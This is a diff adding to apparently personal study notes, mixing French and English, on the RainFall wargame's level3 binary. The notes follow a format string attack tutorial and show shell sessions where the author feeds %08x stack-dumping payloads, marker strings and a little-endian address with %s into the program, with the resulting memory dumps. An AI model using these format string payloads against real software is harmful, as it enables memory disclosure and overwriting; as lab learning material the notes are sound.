@@ -47,3 +47,42 @@ Je me demande ce qui est ecris sur la stack concretement :/
 					printf ("%08x.%08x.%08x.%08x.%08x\n");
 
 Testons:
+
+level3@RainFall:~$ ./level3 
+%08x.%08x.%08x.%08x.%08x\n
+00000200.b7fd1ac0.b7ff37d0.78383025.3830252e\n
+
+Il dump bien des adresses en partant du bas actuel et en remontant vers le haut de la pile
+
+	3.3.2 Viewing memory at any location
+		Rien a dire mais interssant
+
+	3.4 Overwriting of arbitrary memory
+		To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:
+
+				printf ("AAA0AAA1_%08x.%08x.%08x.%08x.%08x");
+
+level3@RainFall:~$ ./level3 
+AAA0AAA1_%08x.%08x.%08x.%08x.%08x
+AAA0AAA1_00000200.b7fd1ac0.b7ff37d0.30414141.31414141
+
+	3.4 Overwriting of arbitrary memory
+
+Example:
+		address = 0x08480110
+			address (encoded as 32 bit le string): "\x10\x01\x48\x08"
+				printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");
+
+Donc j'essaye moi-meme:
+
+level3@RainFall:~$ echo "%08x" | ./level3
+00000200
+
+Je recupere l'adresse 00000200, 
+	encoded as 32 bit le string: "\x00\x02\x00\x00"
+		printf("\x00\x02\x00\x00_%08x.%08x|%s|");
+
+
+level3@RainFall:~$ echo "\x00\x02\x00\x00_%08x.%08x|%s|" | ./level3 
+\x00\x02\x00\x00_00000200.b7fd1ac0|��$�|
+
